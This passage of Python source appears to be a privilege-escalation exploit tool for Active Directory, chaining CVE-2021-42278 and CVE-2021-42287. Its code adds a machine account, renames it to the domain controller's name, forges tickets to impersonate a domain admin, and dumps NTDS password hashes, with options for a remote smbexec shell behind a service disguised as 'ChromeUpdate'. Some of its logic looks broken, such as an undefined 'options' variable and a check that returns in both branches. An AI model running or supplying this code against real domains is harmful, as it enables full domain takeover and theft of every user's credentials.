        del_added_computer(ldap_session, domain_dumper, new_computer_name)

    exploit(dcfull, adminticket, options)

def exploit_sAMANS(username, password, hashes, domain, target, dc_ip, dc_host, k, aesKey, no_tls, no_pass):
    new_computer_name = 'WIN-' + ''.join(random.sample(string.ascii_letters + string.digits, 11)).upper()
    if new_computer_name[-1] != '$':
        new_computer_name += '$'

    old_pass = ""
    old_hash = ""
    new_computer_password = ''.join(random.choice(characters) for _ in range(12))

    domain, username, password, lmhash, nthash = parse_identity(options)
    user = f'{domain}\\{username}'
    if no_tls:
        use_ssl = False
        port = 389
    else:
        use_ssl = True
        port = 636
    ldap_server = ldap3.Server(target, get_info=ldap3.ALL, port=port, use_ssl=use_ssl)
    if k:
        ldap_session = ldap3.Connection(ldap_server)
        ldap_session.bind()
        ldap3_kerberos_login(ldap_session, target, username, password, domain, lmhash, nthash, aesKey, kdcHost=dc_ip,useCache=no_pass)
    elif hashes is not None:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=lmhash + ":" + nthash, authentication=ldap3.NTLM, auto_bind=True)
    else:
        ldap_session = ldap3.Connection(ldap_server, user=user, password=password, authentication=ldap3.NTLM, auto_bind=True)

    cnf = ldapdomaindump.domainDumpConfig()
    cnf.basepath = None
    domain_dumper = ldapdomaindump.domainDumper(ldap_server, ldap_session, cnf)
    check_domain = ".".join(domain_dumper.getRoot().replace("DC=", "").split(","))
    if domain != check_domain:
        print("Pls use full domain name, such as: domain.com/username")
        return
    MachineAccountQuota = 10
    # check MAQ and options
    for i in domain_dumper.getDomainPolicy():
        MachineAccountQuota = int(str(i['ms-DS-MachineAccountQuota']))

    if MachineAccountQuota < 1:
        print(f'Cannot exploit , ms-DS-MachineAccountQuota {MachineAccountQuota}')
        return
    else:
        print(f'Current ms-DS-MachineAccountQuota = {MachineAccountQuota}')

    dn = get_user_info(new_computer_name, ldap_session, domain_dumper)
    if not dn:
        print(f'Target {new_computer_name} not exists!')
        return
    elif dn:
        print(f'Account {new_computer_name} already exists!')
        return

    if dc_host:
        dc_host = dc_host.upper()
        dcfull = f'{dc_host}.{domain}'
        dn = get_user_info(dc_host + "$", ldap_session, domain_dumper)
        if not dn:
            print(f'Machine not found in LDAP: {dc_host}')
            return
    else:
        dcinfo = get_dc_host(ldap_session, domain_dumper, options)
        if len(dcinfo) == 0:
            print("Cannot get domain info")
            exit()
        c_key = 0
        dcs = list(dcinfo.keys())
        if len(dcs) > 1:
            print('We have more than one target, Pls choices the hostname of the -dc-ip you input.')
            cnt = 0
            for name in dcs:
                print(f"{cnt}: {name}")
                cnt += 1
            while True:
                try:
                    c_key = int(input(">>> Your choice: "))
                    if c_key in range(len(dcs)):
                        break
                except Exception:
                    pass
        dc_host = dcs[c_key].lower()
        dcfull = dcinfo[dcs[c_key]]['dNSHostName'].lower()
    print(f'Selected Target {dcfull}')
    # if options.impersonate:
    #     domain_admin = options.impersonate
    # else:
    domainAdmins = get_domain_admins(ldap_session, domain_dumper)
    print(f'Total Domain Admins {len(domainAdmins)}')
    domain_admin = random.choice(domainAdmins)

    print(f'will try to impersonate {domain_admin}')
    adminticket = str(f'{domain_admin}_{dcfull}.ccache')
    if os.path.exists(adminticket):
        print(f'Already have user {domain_admin} ticket for target {dcfull}')
        exploit(dcfull, adminticket, options)
        return

    print(f'Adding Computer Account "{new_computer_name}"')
    print(f'MachineAccount "{new_computer_name}" password = {new_computer_password}')

    # Creating Machine Account
    addmachineaccount = AddComputerSAMR(
        username,
        password,
        domain,
        options,
        computer_name=new_computer_name,
        computer_pass=new_computer_password)
    addmachineaccount.run()

    # CVE-2021-42278
    new_machine_dn = None
    dn = get_user_info(new_computer_name, ldap_session, domain_dumper)
    if dn:
        new_machine_dn = str(dn['dn'])
        print(f'{new_computer_name} object = {new_machine_dn}')

    if new_machine_dn:
        ldap_session.modify(new_machine_dn, {'sAMAccountName': [ldap3.MODIFY_REPLACE, [dc_host]]})
        if ldap_session.result['result'] == 0:
            print(f'{new_computer_name} sAMAccountName == {dc_host}')
        else:
            print(f"Cannot rename the machine account , Reason {ldap_session.result['message']}")
            if not options.no_add:
                del_added_computer(ldap_session, domain_dumper, new_computer_name)
            return
    else:
        return

    # make hash none, we don't need id now.
    hashes = None

    # Getting a ticke
    try:
        getting_tgt = GETTGT(dc_host, new_computer_password, domain, options)
        getting_tgt.run()
    except Exception as e:
        print(f"GetTGT error, error: {e}")
        # Restoring Old Values when get TGT error.
        print(f"Reseting the machine account to {new_computer_name}")
        dn = get_user_info(dc_host, ldap_session, domain_dumper)
        ldap_session.modify(str(dn['dn']), {'sAMAccountName': [ldap3.MODIFY_REPLACE, [new_computer_name]]})
        if ldap_session.result['result'] == 0:
            print(f'Restored {new_computer_name} sAMAccountName to original value')
        else:
            print('Cannot restore the old name lol')
        return

    dcticket = str(dc_host + '.ccache')

    # Restoring Old Values
    print(f"Reseting the machine account to {new_computer_name}")
    dn = get_user_info(dc_host, ldap_session, domain_dumper)
    ldap_session.modify(str(dn['dn']), {'sAMAccountName': [ldap3.MODIFY_REPLACE, [new_computer_name]]})
    if ldap_session.result['result'] == 0:
        print(f'Restored {new_computer_name} sAMAccountName to original value')
    else:
        print('Cannot restore the old name lol')

    os.environ["KRB5CCNAME"] = dcticket

    try:
        executer = GETST(None, None, domain, options=None,
                         impersonate_target=domain_admin,
                         target_spn=f"{options.spn}/{dcfull}")
        executer.run()
    except Exception as e:
        print(f"GetST error, error: {e}")
        return

    print(f'Rename ccache to {adminticket}')
    os.rename(f'{domain_admin}.ccache', adminticket)

    # Delete domain computer we just added.
    if not options.no_add:
        del_added_computer(ldap_session, domain_dumper, new_computer_name)

    # exploit(dcfull, adminticket, options)
    print("Pls make sure your choice hostname and the -dc-ip are same machine !!")
    print('Exploiting..')
    # export KRB5CCNAME
    os.environ["KRB5CCNAME"] = adminticket
    try:
        k = True
        target_ip = dc_ip
        system = bootkey = security = system = ntds = sam = resumefile = outputfile = None
        dumper = DumpSecrets(dcfull, '', '',
                                domain, options)
        dumper.dump()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            traceback.print_exc()
        print(str(e))

if __name__ == '__main__':
    print(banner())

    parser = argparse.ArgumentParser(add_help=True, description="SAM THE ADMIN CVE-2021-42278 + CVE-2021-42287 chain")

    parser.add_argument('account', action='store', metavar='[domain/]username[:password]',
                        help='Account used to authenticate to DC.')
    parser.add_argument('--impersonate', action="store",
                        help='target username that will be impersonated (thru S4U2Self)'
                             ' for quering the ST. Keep in mind this will only work if '
                             'the identity provided in this scripts is allowed for '
                             'delegation to the SPN specified')

    parser.add_argument('-domain-netbios', action='store', metavar='NETBIOSNAME',
                        help='Domain NetBIOS name. Required if the DC has multiple domains.')
    parser.add_argument('-target-name', action='store', metavar='NEWNAME',
                        help='Target computer name, if not specified, will be random generated.')
    parser.add_argument('-new-pass', action='store', metavar='PASSWORD',
                        help='Add new computer password, if not specified, will be random generated.')
    parser.add_argument('-old-pass', action='store', metavar='PASSWORD',
                        help='Target computer password, use if you know the password of the target you input with -target-name.')
    parser.add_argument('-old-hash', action='store', metavar='LMHASH:NTHASH',
                        help='Target computer hashes, use if you know the hash of the target you input with -target-name.')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-shell', action='store_true', help='Drop a shell via smbexec')
    parser.add_argument('-no-add', action='store_true', help='Forcibly change the password of the target computer.')
    parser.add_argument('-create-child', action='store_true', help='Current account have permission to CreateChild.')
    parser.add_argument('-dump', action='store_true', help='Dump Hashs via secretsdump')
    parser.add_argument('-spn', help='Specify the SPN for the ticket (Default: cifs)',  default='cifs')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on account parameters. If valid credentials '
                            'cannot be found, it will use the ones specified in the command '
                            'line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-host', action='store', metavar="hostname", help='Hostname of the domain controller to use. '
                                                                            'If ommited, the domain part (FQDN) '
                                                                            'specified in the account parameter will be used')
    group.add_argument('-dc-ip', action='store', metavar="ip", help='IP of the domain controller to use. '
                                                                    'Useful if you can\'t translate the FQDN.'
                                                                    'specified in the account parameter will be used')
    parser.add_argument('-use-ldap', action='store_true', help='Use LDAP instead of LDAPS')

    exec = parser.add_argument_group('execute options')
    exec.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                      help='Destination port to connect to SMB Server')
    exec.add_argument('-mode', action='store', choices={'SERVER', 'SHARE'}, default='SHARE',
                      help='mode to use (default SHARE, SERVER needs root!)')
    exec.add_argument('-share', action='store', default='ADMIN$',
                      help='share where the output will be grabbed from (default ADMIN$)')
    exec.add_argument('-shell-type', action='store', default='cmd', choices=['cmd', 'powershell'], help='choose '
                                                                                                        'a command processor for the semi-interactive shell')
    exec.add_argument('-codec', action='store', default='GBK',
                      help='Sets encoding used (codec) from the target\'s output (default "GBK").')
    exec.add_argument('-service-name', action='store', metavar="service_name", default="ChromeUpdate",
                      help='The name of the'
                           'service used to trigger the payload')

    dumper = parser.add_argument_group('dump options')
    dumper.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                        help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
                             'Implies also -just-dc switch')
    dumper.add_argument('-just-dc', action='store_true', default=False,
                        help='Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)')
    dumper.add_argument('-just-dc-ntlm', action='store_true', default=False,
                        help='Extract only NTDS.DIT data (NTLM hashes only)')
    dumper.add_argument('-pwd-last-set', action='store_true', default=False,
                        help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
    dumper.add_argument('-user-status', action='store_true', default=False,
                        help='Display whether or not the user is disabled')
    dumper.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')
    dumper.add_argument('-resumefile', action='store', help='resume file name to resume NTDS.DIT session dump (only '
                                                            'available to DRSUAPI approach). This file will also be used to keep updating the session\'s '
                                                            'state')
    dumper.add_argument('-use-vss', action='store_true', default=False,
                        help='Use the VSS method insead of default DRSUAPI')
    dumper.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec',
                        help='Remote exec '
                             'method to use at target (only when using -use-vss). Default: smbexec')

    if len(sys.argv) == 1:
        parser.print_help()
        # sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password = parse_credentials(options.account)

    if options.just_dc_user is not None:
        if options.use_vss is True:
            print('-just-dc-user switch is not supported in VSS mode')
            # sys.exit(1)
        elif options.resumefile is not None:
            print('resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch')
            # sys.exit(1)
        else:
            # Having this switch on implies not asking for anything else.
            options.just_dc = True

    if options.use_vss is True and options.resumefile is not None:
        print('resuming a previous NTDS.DIT dump session is not supported in VSS mode')
        # sys.exit(1)

    try:
        if domain is None or domain == '':
            print('Domain should be specified!')
            # sys.exit(1)

        if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:

            password = getpass("Password:")

        if options.aesKey is not None:
            options.k = True

        samtheadmin(username, password, domain, options)
    except ldap3.core.exceptions.LDAPBindError as e:
        print(f"Pls check your account. Error: {e}")
    except ldap3.core.exceptions.LDAPSocketOpenError as e:
        print(f"If ssl error, add `-use-ldap` parameter to connect with ldap. Error: {e}")
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:

            traceback.print_exc()
        print(e)
